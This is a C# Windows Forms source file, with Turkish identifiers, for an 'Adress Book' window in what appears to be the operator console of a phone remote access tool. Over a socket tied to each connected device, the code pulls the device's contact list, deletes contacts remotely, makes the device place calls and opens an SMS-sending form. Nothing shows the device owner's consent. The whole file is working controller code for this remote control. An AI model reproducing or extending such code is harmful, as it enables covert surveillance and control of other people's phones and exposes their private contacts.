using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Rehber : Form
    {
        Socket sco; public string ID = "";
        public Rehber(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            if (arg != "REHBER YOK")
            {
                string[] ana_Veriler = arg.Split('&');
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('=');
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.ImageIndex = 0;
                        item.SubItems.Add(bilgiler[1]);
                        listView1.Items.Add(item);
                    }
                    catch (Exception) { }
                }
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no Contact");
                listView1.Items.Add(item);
            }
        }
        private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Ekle(sco).Show();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", sco);
                listView1.SelectedItems[0].Remove();
                Text = "Adress Book - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sco.Handle.ToString());
            }
            catch (Exception) { }
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("REHBERIVER", "[VERI][0x09]", sco);
                Text = "Adress Book";
            }
            catch (Exception) { }
        }

        private void araToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                try
                {
                    Form1.KomutGonder("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sco);
                    MessageBox.Show("Call command was sent.", "Call", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
                catch (Exception) { }
            }
        }

        private void smsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                new SMS(sco, listView1.SelectedItems[0].SubItems[1].Text).Show();
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
